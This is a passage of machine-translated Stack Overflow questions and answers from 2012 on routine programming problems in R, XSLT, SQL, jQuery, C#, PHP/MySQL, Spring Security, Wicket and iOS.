(x1 >= 0)_TRUE    0.7470     1.7287   0.432    0.666
(x2)_Old          0.7470     1.7287   0.432    0.666
(x2)_Young       18.0026  4612.2023   0.004    0.997 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-05-01T20:11:22.030

除了上面的注释之外，另一部分是将所有数据放在数据框中，并相应地命名变量。然后变量名不是取自塞进你的公式的一个又大又丑的表达式：

```
library(car)
dat <- data.frame(y = y,
                  x1 = cut(x1,breaks = c(-Inf,0,Inf),labels = c("x1 < 0","x1 >= 0"),right = FALSE),
                  x2 = as.factor(x2))

#To illustrate Brian's suggestion above
options(decorate.contr.Treatment = "")
model1 <- glm(y~x1+x2,binomial,data = dat,
            contrasts = list(x1 = "contr.Treatment",x2 = "contr.Treatment"))
summary(model1)

Call:
glm(formula = y ~ x1 + x2, family = binomial, data = dat, contrasts = list(x1 = "contr.Treatment", 
    x2 = "contr.Treatment"))

Deviance Residuals: 
    Min       1Q   Median       3Q      Max  
-1.7602  -0.8254   0.3456   0.8848   1.2563  

Coefficients:
             Estimate Std. Error z value Pr(>|z|)
(Intercept)   -0.1835     1.0926  -0.168    0.867
x1[x1 >= 0]    0.7470     1.7287   0.432    0.666
x2[Old]        0.7470     1.7287   0.432    0.666
x2[Young]     18.0026  4612.2023   0.004    0.997 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-01T20:11:19.207

对于第一部分，在拟合模型*之前先获取数据。*收集数据框中的变量并将处理后的变量包含在该数据框中，这样您就可以控制它们的名称。例如：

```
set.seed(1)
x1 <- rnorm(10)
y <- as.factor(sample(c(1,0), 10, replace=TRUE))
x2 <- sample(c('Young', 'Middle', 'Old'), 10, replace=TRUE)
dat <- data.frame(y = y, x1 = x1, x2 = factor(x2),
                  x1.gt.0 = factor(x1 >= 0))
model1 <- glm(y~ x1.gt.0 + x2, data = dat, family = binomial)

> coef(model1)
(Intercept) x1.gt.0TRUE       x2Old     x2Young 
 -0.1835144   0.7469661   0.7469661  18.0026168 
```

这就是您应该在大多数 R 函数中使用公式接口的方式。

# xml - 应用 XSLT 添加标签

> ID：10403105
> 
> 赞同：2
> 
> 时间：2012-05-01T19:28:15.200
> 
> 标签：xml, xslt, tags, xslt-2.0, adobe-indesign

我正在从 InDesign 导出 XML 文件。此文件中的文本包含引用特定语法概念的上标；但是，这些上标在 XML 文件中导出为文本。我需要编写一个 XSLT，这样当它应用到 InDesign 文件时，它只会在上标上添加一个小标签。

这是它的导出方式：

```
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Root>
<Content>
<PhraseNative aid:table="cell" aid:crows="1" aid:ccols="1" aid:ccolwidth="260.5">
<Phrase>    1\.  Mark is1a playing2 videogames.</Phrase> 
</PhraseNative>
</Content>
</Root> 
```

这应该是最终代码。

```
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Root>
<Content>
<PhraseNative aid:table="cell" aid:crows="1" aid:ccols="1" aid:ccolwidth="260.5">
<Phrase>    1\.  Mark is<tag>1a</tag> playing<tag>2</tag> videogames.</Phrase> 
</PhraseNative>
</Content>
</Root> 
```

只要数字和字母是字符串的最后两位或三位数字，这些标签就会始终出现。有时它只是一个数字。输出根本没有变化。这只是为了使标签在导出回网页时不会丢失。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-01T19:43:12.147

您使用 XSLT 2.0 标记了这个问题，所以这里有一个 2.0 选项。

注意：我必须为`aid`前缀添加一个虚拟 xmlns。

此外，您很可能需要改进正则表达式，但这应该可以帮助您入门。

**XML 输入**

```
<Root>
  <Content>
    <PhraseNative aid:table="cell" aid:crows="1" aid:ccols="1" aid:ccolwidth="260.5" xmlns:aid="somexmlns">
      <Phrase>    1\.  Mark is1a playing2 videogames.</Phrase> 
    </PhraseNative>
  </Content>
</Root> 
```

**XSLT 2.0**

```
<xsl:stylesheet version="2.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
  xmlns:aid="somexmlns">
  <xsl:output indent="yes"/>
  <xsl:strip-space elements="*"/>

  <xsl:template match="node()|@*">
    <xsl:copy>
      <xsl:apply-templates select="node()|@*"/>
    </xsl:copy>
  </xsl:template>

  <xsl:template match="Phrase">
    <xsl:copy>
      <xsl:apply-templates select="@*"/>
      <xsl:analyze-string select="." regex="([a-z]+)([0-9]+[a-z]*)">
        <xsl:matching-substring>
          <xsl:value-of select="regex-group(1)"/>
          <tag>
            <xsl:value-of select="regex-group(2)"/>    
          </tag>
        </xsl:matching-substring>
        <xsl:non-matching-substring><xsl:value-of select="."/></xsl:non-matching-substring>
      </xsl:analyze-string>
    </xsl:copy>
  </xsl:template>

</xsl:stylesheet> 
```

**XML 输出**

```
<Root>
   <Content>
      <PhraseNative xmlns:aid="somexmlns" aid:table="cell" aid:crows="1" aid:ccols="1"
                    aid:ccolwidth="260.5">
         <Phrase>    1\.  Mark is<tag>1a</tag> playing<tag>2</tag> videogames.</Phrase>
      </PhraseNative>
   </Content>
</Root> 
```

*使用 Saxon-HE 9.3 进行测试。*

# sql - 大于或小于运算符和版本

> ID：10403106
> 
> 赞同：3
> 
> 时间：2012-05-01T19:28:19.240
> 
> 标签：sql, sql-server, tsql

我有一个正在创建的 MS SQL 查询，我需要根据版本号确定特定记录是否属于“新”或“旧”类别。

有一列“VersionNum”，旧版本是 2.75.99.99 及以下的任何版本号，而新版本是 2.76.00.00 及以上的任何版本号。该列的数据类型是 varchar(20)。

我正在考虑从 X.XX 中获取字符串的一个子集并将其转换为小数。然后，一旦所有版本都转换为 X.XX 十进制，我可以通过在 select 中的 case 语句中执行 > 或 < 来确定旧版本或新版本。

这是决定版本号落在哪里的正确或理想的方法吗？或者有没有其他方法。我只是问，因为我会想象在其他地方需要类似的东西，这不是一个独特的情况。

编辑：另一个问题。有一些不是 X.XX.XX.XX (2.76.00.00) 的版本，还有一些是 8.00.00 的形式，将被视为“旧”版本。这比我曾经想象的更让系统感到困惑。我确实得到了 5 位版本 (8.00.00) 一直被认为是旧版本的信息。因此，只要有 5 个数字，版本就旧了。所以我想我会执行一个类似于以下的案例陈述：

```
SELECT
    Old = CASE WHEN LEN(VersionNum) < 10 THEN 1
               WHEN CAST(SUBSTRING(VersionNum,1,4) AS DECIMAL(5,2)) < 1.52
                    AND LEN(VersionNum) >= 10 THEN 1
               ELSE 0
          END,
    New = CASE WHEN CAST(SUBSTRING(VersionNum,1,4) AS DECIMAL(5,3)) >= 1.52
                    AND LEN(VersionNum) >= 10 THEN 1
               ELSE 0
          END
FROM
    VersionTable 
```

我的逻辑正确吗？或者我错过了什么。长度的不等式非常烦人。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-05-01T19:35:23.747

您始终可以将这样的“数字”表示为整数，假设它始终只有 4 个部分：

```
DECLARE @x VARCHAR(20);

SELECT @x = '2.76.99.99';

SELECT 
 v = PARSENAME(@x, 4) * 1000000
   + PARSENAME(@x, 3) * 10000
   + PARSENAME(@x, 2) * 100
   + PARSENAME(@x, 1); 
```

结果：

```
2769999 
```

因此，如果您创建视图或计算列，则可以使用简单的数学进行比较，而不是尝试进行复杂的解析/转换。

**根据评论**编辑****

 **如果表中有一些只有三个八位字节的值，为什么不解决这个问题呢？

```
UPDATE dbo.table SET col = col + '.00'
  WHERE LEN(x) < 10; 
```

如果你想更精确：

```
UPDATE dbo.table SET col = LTRIM(RTRIM(col)) + '.00'
  WHERE LEN(LTRIM(RTRTIM(x))) - LEN(REPLACE(LTRIM(RTRIM(x)), '.', '')) = 3; 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-01T19:35:11.433

真正解决这个问题的方法是根据您需要的范围将您的版本号分解为一系列`smallint`、`int`或字段。`bigint`如果你不能这样做，那么你可能会为他们制作一个查找表，但这是一个更混乱的解决方案。

如果你有，说：

```
CREATE TABLE Versions
(MajorVersion int,
 MinorVersion int,
 Subversion int,
 Build int) 
```

然后，您可以根据需要比较各个字段。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-01T19:50:51.767

如果版本字符串中的数字在左侧补零，那么您可以使用字符串比较：“2.75.99.99”<“2.76.00.00”。

假设格式在所有版本中保持一致，这将起作用。**

# android - 为什么打开对话框时我的“按下”和/或“选择”按钮状态会丢失？

> ID：10403110
> 
> 赞同：3
> 
> 时间：2012-05-01T19:28:37.243
> 
> 标签：android, button, android-alertdialog

我有一个带有两个按钮的活动（在运行 4.0.4 的 Xoom 上）。单击时，我通过 setPressed() 以编程方式切换它们的状态。我意识到 ToggleButton 或 RadioButton 可能更合适，但我无法从我们的 UX 团队获得更改。问题是，当我打开一个新片段（我的片段仍然可见）并且出现网络错误时，会显示一个 AlertDialog 并且我的“按下”按钮状态丢失（背景颜色变为“未按下”。）如果对话框永远不会打开，按钮状态很好（没有丢失）。知道是什么原因造成的吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-01T20:23:33.913

当 a`Dialog`被显示时`Activity`，触发它的是在后台。`Button`在后台活动中处于`pressed`状态是没有意义的。该`pressed`状态指示用户正在与作为背景的一部分进行`View`交互，并且用户无法与之交互`Views``Activity`

# java - 如何使用 JAX-WS 2.0 模拟肥皂响应？

> ID：10403112
> 
> 赞同：0
> 
> 时间：2012-05-01T19:28:50.750
> 
> 标签：java, soap

我正在使用 JAX-WS 附带标准 jdk（我使用的是 1.6）。我想知道如何模拟肥皂响应进行测试？例如，我可以在每次调用soap 服务时将soap 响应xml 设置为字符串（从文件中读取）。

谢谢，

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2017-12-19T21:14:09.820

虽然几年前创建自己的 SOAP API 模拟器（例如使用 JAX-WS）非常好，但在 2017 年有许多开源和商业工具可用，因此您不必自己动手。您可以使用[API 模拟工具](https://en.wikipedia.org/wiki/Comparison_of_API_simulation_tools)来模拟您正在使用的 API。

以下是一些工具的列表：

*   [气垫蝇](https://docs.hoverfly.io/en/latest/pages/introduction/introduction.html)
*   [穆特银行](http://www.mbtest.org/docs/gettingStarted)
*   [SoapUI 模拟服务器](https://www.soapui.org/soap-mocking/getting-started.html)
*   [交通鹦鹉](http://trafficparrot.com/documentation/3.10.x/start.html)
*   [线模](http://wiremock.org/docs/getting-started/)
*   [Wiremock.NET](https://github.com/WireMock-Net/WireMock.Net/wiki)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-01T19:55:17.997

如果您的 IDE 允许，您应该有一个 WSDL 和一个测试器。

因此，转到您的 WSDL 网址，然后将 WSDL 替换为 Tester。

这就是 netbeans 的工作方式，我将 eclipse 配置为以相同的方式工作。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-01T20:02:45.703

可以使用 JAX WS 在原始 xml 中工作并发送您需要的 xml。您可以在应用程序数据级别（即封装在`SOAP`要由 Web 服务处理的信封中的消息）或在`SOAP`信封级别工作。
您需要阅读有关[Dispatch](http://docs.oracle.com/javase/6/docs/api/javax/xml/ws/Dispatch.html)的信息。
如果你谷歌有例子。例如[创建一个 Dispatch 客户端](http://www.ibm.com/developerworks/websphere/library/techarticles/0707_thaker/0707_thaker.html)

# jquery - jquery获取选择的值

> ID：10403115
> 
> 赞同：3
> 
> 时间：2012-05-01T19:29:01.173
> 
> 标签：jquery, html-select

我在尝试使用 jquery 获取选择框的值时遇到问题

```
<select id='form[1]' name='form[1]'>
    <option val='1'>1</option>
    <option val='2'>2</option>
</select> 
```

我试过了：

```
$('#form[1]').val() 
```

和：

```
$('#form\\[1\\]').val() 
```

但没有运气

这最终对我有用，我将其发布为答案，但我不能 8 小时

```
var num = $(".forms").attr('name', 'form[1]');

$(num[0]).val(); 
```

谢谢你的帮助

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-05-01T19:30:53.467

试试`$('#form\\[1\\]').val()`。你需要逃避`[]`

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-05-01T19:31:37.023

您的问题出在选择器上。括号必须被转义：`$('#form\\[1\\]').val()`

顺便说一句，我从许多框架中看到的约定是让 id 成为一些东西`form-1`

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-05-01T19:33:49.893

您可以使用[属性等于选择器](http://api.jquery.com/attribute-equals-selector/)来获取元素。我认为这比逃避`[]`.

```
$('select[id="form[1]"]') 
```

# c# - 这个短路的 if 语句有什么问题？

> ID：10403116
> 
> 赞同：1
> 
> 时间：2012-05-01T19:29:01.623
> 
> 标签：c#

我知道这可能真的很愚蠢，但我不明白为什么这个 if 语句失败了：

如果我在控制台输入`1`或输入`2`，则第一个 if 语句失败，但如果我首先将结果存储在 bool 中，则第二个语句通过。为什么？我可能在这里做一些愚蠢的事情？

```
Console.WriteLine("Enter 1 for AM or 2 for PM?"); 
string amOrPM = Console.ReadLine();

//Why does this fail if I enter 1 or 2?
if (amOrPM != "1" || amOrPM != "2") 
    Console.WriteLine("You must enter 1 for AM or 2 for PM. Try again.");

//This works!
bool valid = (amOrPM != "1" || amOrPM != "2"); 
if (!valid) 
    Console.WriteLine("You must enter 1 for AM or 2 for PM. Try again."); 
```

我刚刚注意到第一个 if 语句，我必须放 && 而不是 ||，但这很令人困惑，因为我将其读作：如果`amOrPm`不等于`1`或`amOrPM`不等于`2`，则转到控制台行。我在阅读这个错误的定义吗？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-05-01T19:31:39.880

这样想 - 如果它*是*1，那么它不可能是 2，反之亦然。所以它肯定是*“*非 1”*或*“非 2”。

你的意思是：

```
if (amOrPM != "1" && amOrPM != "2") 
```

（如果它是“非 1”*并且*它是“非 2”。）

或者：

```
if (!(amOrPm == "1" || amOrPm == "2")) 
```

有关更多转换，请参阅[德摩根定律](http://en.wikipedia.org/wiki/De_Morgan%27s_laws)。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-05-01T19:32:43.127

你有 ！在第二种情况下的有效前面 - 你正在反转结果。删除那个！他们的行为都是一样的。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-05-01T19:32:03.883

正确的做法是`if (amOrPM != "1" && amOrPM != "2")`。如果它既不是 1 也不是 2，你想写。第二个有效，因为它否定，它不是 1 就是 2。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2012-05-01T19:33:49.240

或是一个逻辑或。它的意思是这样的：

如果输入 1，则第一个条件为假，但第二个条件为真，因此失败。

如果输入 2，则第一个条件为真，但第二个条件为假，因此失败。对于他们俩来说，条件永远不会是错误的。

# php - 在字符串中插入函数 mysql_real_escape_string 时出错

> ID：10403118
> 
> 赞同：-4
> 
> 时间：2012-05-01T19:29:31.210
> 
> 标签：php, mysql

我知道我们可以在 Javascript 中的字符串之间插入一个函数，所以 PHP 也应该可以。

Javascript：

```
var myString = "aString " + function_returning_string() + " anotherString"; 
```

PHP：可以使用 sprintf 来完成，如本页[http://fr.php.net/mysql_real_escape_string上的示例](http://fr.php.net/mysql_real_escape_string)

```
$query = sprintf("SELECT * FROM users WHERE user='%s' AND password='%s'",
            mysql_real_escape_string($user),
            mysql_real_escape_string($password)); 
```

它工作得很好，但我想知道为什么当我们像这样直接将所有内容放在字符串中时它不起作用：

```
$query = "SELECT * FROM users WHERE user='".mysql_real_escape_string($user)."' AND password='".mysql_real_escape_string($password)."'"; 
```

我们应该怎么做？

在一些答案之后，我意识到这个问题与嵌入在字符串中的函数无关，因为其他函数正在工作，所以它显然是 mysql_real_escape_string ~~（不推荐使用）~~函数。

当我将结果保存在变量中然后将其插入字符串时，此函数也不起作用。

这是我完整的 php 文件，在 Firebug 控制台中没有修改 500 Internal Server Error：

```
<?php
/*ini_set('display_errors', 'On');
error_reporting(E_ALL | E_STRICT);

require_once('/var/www/FirePHPCore/FirePHP.class.php');
ob_start();
$firephp = FirePHP::getInstance(true);*/

$reference = $_POST['reference'];
$txtGauche = $_POST['motGauche'];
$txtDroite = $_POST['motDroite'];
$ptGauche = $_POST['repGauche'];
$ptDroite = $_POST['repDroite'];

$base = mysql_connect("localhost","root","root");

$sql_utf8 = "SET NAMES utf8;";
$sql_base = "CREATE DATABASE IF NOT EXISTS elan
DEFAULT CHARACTER SET utf8
DEFAULT COLLATE utf8_general_ci;";
$sql_table = "CREATE TABLE IF NOT EXISTS relier_points (
`Reference` VARCHAR(20),
`TexteGauche` VARCHAR(500),
`TexteDroite` VARCHAR(500),
`ReponseGauche` VARCHAR(300),
`ReponseDroite` VARCHAR(300));";

/*$sql_insert = sprintf("INSERT INTO relier_points VALUES('%s','%s','%s','%s','%s')",
    mysql_real_escape_string($reference),
    mysql_real_escape_string($txtGauche),
    mysql_real_escape_string($txtDroite),
    mysql_real_escape_string($ptGauche),
    mysql_real_escape_string($ptDroite));*/

$reference = mysql_real_escape_string($reference);
$txtGauche = mysql_real_escape_string($txtGauche);
$txtDroite = mysql_real_escape_string($txtDroite);
$ptGauche = mysql_real_escape_string($ptGauche);
$ptDroite = mysql_real_escape_string($ptDroite);

$sql_insert = "INSERT INTO relier_points VALUES('$reference','$txtGauche','$txtDroite','$ptGauche','$ptDroite')");

mysql_query($sql_utf8,$base);
mysql_query($sql_base,$base);

mysql_select_db("elan",$base);

mysql_query($sql_table,$base);
$result = mysql_query($sql_insert,$base);

//$firephp->log($result, 'test');

mysql_close($base);

if($result == TRUE)
    echo "Exercice $reference reçu";
else
    var_dump($result);
?> 
```

哦，对不起，我昨天累了。如果您没有注意到，我在直接转换字符串中的 $sql_insert 时忘记从 sprintf 中删除最后一个“)”。

顺便说一句，它现在可以在没有变量的情况下工作：

```
$sql_insert = "INSERT INTO relier_points VALUES('"
    .mysql_real_escape_string($reference)."','"
    .mysql_real_escape_string($txtGauche)."','"
    .mysql_real_escape_string($txtDroite)."','"
    .mysql_real_escape_string($ptGauche)."','"
    .mysql_real_escape_string($ptDroite)."')"; 
```

所以这是一个笨拙的错误，但至少我知道我应该使用 PDO 或 MySQLi 而不是 mysql_ 函数:)

* * *

## 回答 #1

> 赞同：-2
> 
> 时间：2012-05-01T19:36:34.500

你应该试试veriables。我的意思是这样

```
$user = mysql_real_escape_string($user);
$password = mysql_real_escape_string($password);
$query = "SELECT * FROM users WHERE user='$user' AND password='$passowrd'"; 
```

它应该可以工作。而且它易于阅读代码，也很简单。

# forms - Spring安全登录表单是否等同于Httpclient post方法？

> ID：10403121
> 
> 赞同：0
> 
> 时间：2012-05-01T19:29:42.973
> 
> 标签：forms, login, spring-security, httpclient

**春季安全登录表单**这是 login.jsp 即[http://localhost:8082/Spring-MVC/login.jsp](http://localhost:8082/Spring-MVC/login.jsp)

```
<form name='f' action="<c:url value='j_spring_security_check' />"
        method='POST'>

        <table>
            <tr>
                <td>User:</td>
                <td><input type='text' name='j_username' value=''>
                </td>
            </tr>
            <tr>
                <td>Password:</td>
                <td><input type='password' name='j_password' />
                </td>
            </tr>
            <tr>
                <td colspan='2'><input name="submit" type="submit"
                    value="submit" />
                </td>
            </tr>
            <tr>
                <td colspan='2'><input name="reset" type="reset" />
                </td>
            </tr>
        </table>

    </form> 
```

**JSP代码相当于上面的post表单方法，**

```
<%  HttpClient httpClient = new HttpClient();
            PostMethod postMethod = new PostMethod("http://localhost:8082/SpringMVC/j_spring_security_check");
            postMethod.addParameter("j_username", "mkyong");
            postMethod.addParameter("j_password", "123456");
            try {
                httpClient.executeMethod(postMethod);
            } catch (HttpException e) {
                e.printStackTrace();
            } catch (IOException e) {
                e.printStackTrace();
            }

            if (postMethod.getStatusCode() == HttpStatus.SC_OK) {
                String resp = postMethod.getResponseBodyAsString();
            } else {
                 //...postMethod.getStatusLine();
            }
            %> 
```

**实际上，我认为两者的结果相同，但在第二种情况下，通过使用 post 方法，它不会将我重定向到主页。我想使用 httpclient 代码自动提交上述表单。请帮帮我**

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-01T19:37:48.393

您没有在发布请求中从 JSP 传播会话，因此您正在向身份验证过滤器发送一次性请求

# youtube - Z-Index 和 YouTube 视频...重叠内容 Quandry

> ID：10403124
> 
> 赞同：2
> 
> 时间：2012-05-01T19:29:48.990
> 
> 标签：youtube

我查看了有关堆栈溢出中 z-index 问题的其他问题，但我并没有完全理解将信息添加到 youtube URL 的 URL 末尾的概念......我不知道从哪里开始添加 wmode 或者我为什么要补充一下...我只是希望它们不要流过页面顶部的导航...有人可以为我的 youtube 视频推荐一个修复程序，因为我在我的网站上广泛使用嵌入式 youtube 视频并且看起来有 z-index 问题业余爱好者，如果可能的话，我宁愿让我的视频在导航栏下方运行。我尝试设置一个 div 并删除 z-index，但我要么做错了，要么这不是一个明确的修复。我遇到问题的 URL 位于 ... [http://www.nicholaslawson.com/youtube.com将不胜感激](http://www.nicholaslawson.com/youtube.com)... 感谢您的时间。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-05-01T19:36:10.003

这是一个非常简单的修复。但添加： `?wmode=opaque` 到网址的末尾。例如：

```
http://youtube.com/embed/IdG0e5h3re 
```

会成为

```
http://youtube.com/embed/IdG0e5h3re?wmode=opaque 
```

我前段时间有同样的问题！

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-01T19:34:32.110

这是我最近用来嵌入 youtube 视频的代码

```
<iframe width="640" height="390" src="https://www.youtube.com/embed/PlkWVkpP59U?rel=0&amp;modestbranding=1&amp;wmode=transparent" frameborder="0" allowfullscreen=""></iframe> 
```

ID`PlkWVkpP59U`是您更改视频时唯一需要更改的部分。

然后，您可以将 iframe 视为具有 z-index 和其他任何内容的普通元素，尽管通常在执行此操作后一切正常

# java - 不错的网址：Wicket 1.5 mountPage

> ID：10403131
> 
> 赞同：2
> 
> 时间：2012-05-01T19:30:47.660
> 
> 标签：java, url, bookmarks, wicket-1.5

我正在使用 Wicket 1.5.3 并在扩展的 WebApplication 类中注册主页，`HomePage.java`漂亮的 URL 为：

```
mountPage('home', HomePage.class); 
```

结果是一个 URL：[http://localhost:8080/MyApplication/app/home?1](http://localhost:8080/MyApplication/app/home?1)

“？1”是从哪里来的，我该如何删除它？

如果我希望 URL 为[http://localhost:8080/MyApplication/app/home](http://localhost:8080/MyApplication/app/home)，那我该怎么办？

提前致谢。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-01T19:42:23.363

您看到的参数是页面版本（因为检票口页面是有状态的）。已经有一个[SO question 如何摆脱 url 中的这个版本](https://stackoverflow.com/questions/8602489/delete-version-number-in-url)。

# mysql - MySql select with max 得到错误的ID？

> ID：10403132
> 
> 赞同：1
> 
> 时间：2012-05-01T19:30:50.687
> 
> 标签：mysql

当我运行我的选择

`SELECT id, MAX(amount) AS value FROM bids`

它似乎返回了错误的 id...它返回第一个 id 值而不是 MAX(amount) 选择的 id。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-01T19:33:56.153

这是意料之中的 - 您正在使用没有任何“分组依据”子句的聚合函数。MySQL 很有礼貌，并假设您希望在表上设置一个 GLOBAL 最大值，而您很可能想要这样做：

```
SELECT id, MAX(amount) AS value
FROM bids
GROUP BY id 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-01T19:33:26.980

你需要做这样的事情（虽然我不确定这是获取你想要的数据的最佳方式）：

```
SELECT id
FROM bids
WHERE amount = MAX(amount) 
```

您也许可以添加一个`LIMIT`或一个`ORDER BY`子句（或两者）以进一步减少您要查找的数据。

你也可以试试：

```
SELECT id
FROM bids
ORDER BY amount DESC
LIMIT 1 
```

在你的桌子上得到一个`id`最大值。`amount`如果您这样做，您最终会希望在您的`amount`字段上放置一个索引以加快查询速度。这一切都假设您想要与表`id`中最高的一起使用，`amount`仅此而已。

# doxygen - 使用 \snippet 命令格式化和突出显示 Ruby 语法

> ID：10403135
> 
> 赞同：1
> 
> 时间：2012-05-01T19:31:14.830
> 
> 标签：doxygen

Doxygen 1.7.6.1 - 我正在使用 \snippet 命令来包含 Ruby 代码示例以及从 C++ 文件生成的 html 输出，但是 Ruby 的语法高亮显示被读取为 C++。有没有办法为 ruby​​ 代码指定 Ruby 语法突出显示。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-02T10:10:52.943

我不确定这是否可以使用 doxygen。[但是，您可以使用Pygments](http://pygments.org/)之类的东西来解析代码，这将生成 Ruby 代码的语法高亮 HTML。然后，您可以在 doxygen 文档中包含 HTML。这可以通过使用`INPUT_FILTER`配置文件选项在每次您想要生成文档时在 Ruby 文件上调用 Pygments 来自动化。

# ios - iOS - 应用程序崩溃 Garbagecollector 的错？

> ID：10403136
> 
> 赞同：0
> 
> 时间：2012-05-01T19:31:15.590
> 
> 标签：ios, crash, garbage-collection, alloc

我和我的团队正在开发一个测验应用程序，我们有 1 个视图，我们只需重新加载标签和按钮上的文本。现在，当我们开始测验时，有 2 个循环从数据库中加载问题和答案。在这些循环中，我们初始化在 .h 文件中声明的对象。所以我们要做的是： obj = [[class alloc] initwith:stuff]; 在我们第 6 次调用 2 个循环所在的方法之前，它一直运行良好。有时它在第一个循环中崩溃，有时在第二个循环中崩溃。现在奇怪的是，如果我们在“再次播放”按钮上调用该方法两次，它会在第三次崩溃（方法调用 6 次然后 = 崩溃），所以我们认为它与内存或所以。我们尝试清理项目，在 iPad 和模拟器上运行它。没有效果。错误消息是我们的数组

目前我不能给你一个代码片段，但最简单的方法是在用户按下“再次播放”按钮时简单地重置应用程序。有什么简单的方法可以做到这一点？如果应用程序只是关闭并使用启动画面重新打开，那也很好。

如果你现在不能提出任何建议，我明天会添加代码片段

提前致谢

编辑：SIGABRT 这是错误消息：SoccerQuiz[1563:f803] *** 由于未捕获的异常 'NSRangeException' 导致应用程序终止，原因：'*** -[__NSArrayM objectAtIndex:]: index 0 beyond bounds for empty array' *** First throw call stack : (0x159e022 0x172fcd6 0x158ad88 0x4719 0x3455 0x159fe99 0xe214e 0xe20e6 0x188ade 0x188fa7 0x188266 0x1073c0 0x1075e6 0xeddc4 0xe1634 0x1488ef5 0x1572195 0x14d6ff2 0x14d58da 0x14d4d84 0x14d4c9b 0x14877d8 0x148788a 0xdf626 0x20ed 0x2055) terminate called throwing an exception(lldb)

我的代码：

```
-(NSMutableArray*) readFromDatabase{

//if modus is true 20 questions will be loaded(untested). we set mds to 10 for now which works for the first 5 times and then crashes the 6th time
int mds = 0;
if (modus)
 mds = 20;
 else mds = 10;
bool loop = true;

//a_data is the array in which the data object is. it is filled with the questions and answeres    
NSMutableArray * a_data = [[NSMutableArray alloc] init];
//check_id is the array in which the question ids from the database are saved
NSMutableArray * check_id = [[NSMutableArray alloc] init];

//ant is the array in which the 4 possible answers are saved.
NSMutableArray *ant = [[NSMutableArray alloc] init];

//in id_frage the id of the question is saved and in frage the question itself
NSString *id_frage = [[NSString alloc] init];
NSString *frage = [[NSString alloc] init];

//in sql_id the statement for the question is saved
NSString *sql_id = [[NSString alloc] initWithFormat:@"select id from QQUESTION where level = %@ order by random() limit 1", difficulty];

//in the method sqlquery we get data from the database
id_frage = [[self sqlquery: sql_id with:@"Q"] objectAtIndex:0];

[check_id addObject:id_frage];

NSLog(@"1");
//we use these loops to read unique question ids from the database, as you can see random questions are loaded from the database (sql_id statement)
for (int z = 0; z < mds; z++)
{
    while (loop)
    {
    for (int y = 0; y <= check_id.count; y++)
    {
        //this loop checks if the question id is already in check_id
        if ([[check_id objectAtIndex:y] isEqualToString:id_frage])
        {
            id_frage = [[self sqlquery: sql_id with:@"Q"] objectAtIndex:0];    

            break;

        }
        else { 
            //if the id doesnt already exit, it will be added to the check_id array
            if (y == check_id.count-1)
            {
            [check_id addObject:id_frage];
            loop = false;
            break; 
            }
        }
    }
    }
    loop = true;
    id_frage = [[self sqlquery: sql_id with:@"Q"] objectAtIndex:0];
}

      NSLog(@"2");

//this loops loads the questions and answers that fit to the question ids
for (int x = 0; x < mds; x++)
{

//sql_q statement for the questions
NSString *sql_q = [[NSString alloc] initWithFormat:@"select TEXT from QQUESTIONTEXT where ID_QUESTION = '%@' and LANGUAGE = '%@'", [check_id objectAtIndex:x], language];

frage = [[self sqlquery:sql_q with:@"Q" ]objectAtIndex:0];

//sql_a statement for the answers    
NSString *sql_a = [[NSString alloc] initWithFormat:@"select answer.correct, answertext.text from QANSWER as answer, QANSWERTEXT as answertext where answer.ID_QUESTION='%@' and answer.ID = answertext.ID_ANSWER and answertext.LANGUAGE = '%@'", [check_id objectAtIndex:x], language];

ant = [self sqlquery: sql_a with:@"A"];    

    //this loop sets the right answer at the first position of the array
    for(int a = 0; a<ant.count-1; a++)
    {
        if([[ant objectAtIndex:a] isEqualToString:@"1"])
        {
            a++;
            NSString *h = [[NSString alloc]initWithFormat:[ant objectAtIndex:1]];

            [ant replaceObjectAtIndex:1 withObject:[ant objectAtIndex:a]];
            [ant replaceObjectAtIndex:a withObject:h];
            a--;

            break;

        }

    }

//this data object 'd' is filled with a question and 4 answers and 10 or 20 will be added to a_data which will be returned
d = [[data alloc] initFrage:frage mitAntwort1:[ant objectAtIndex:1] Antwort2:[ant objectAtIndex:3] Antwort3:[ant objectAtIndex:5] Antwort4:[ant objectAtIndex:7]];
[a_data addObject:d];
}

 NSLog(@"3");

return a_data; 
```

}

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-01T20:13:21.233

iOS 上没有垃圾收集器——有手动或自动引用计数 (ARC)。在任何一种情况下，对象都通过使用保留和释放进行引用计数。使用 ARC，您不必自己拨打这些电话，但这并不意味着您仍然不会遇到问题。

没有您的代码或任何信息，我只能提供一般性建议。我假设您的崩溃是 EXC_BAD_ACCESS 或等效的。

我写了一篇博客来解释这个问题以及如何解决它

[http://loufranco.com/blog/files/Understanding-EXC_BAD_ACCESS.html](http://loufranco.com/blog/files/Understanding-EXC_BAD_ACCESS.html)

在你的情况下，这就是我会做的

1.  运行分析并修复它标记的每个问题
2.  打开僵尸并重现您的问题。如果您正在与僵尸对象交谈，现在应该更容易看到发生了什么。

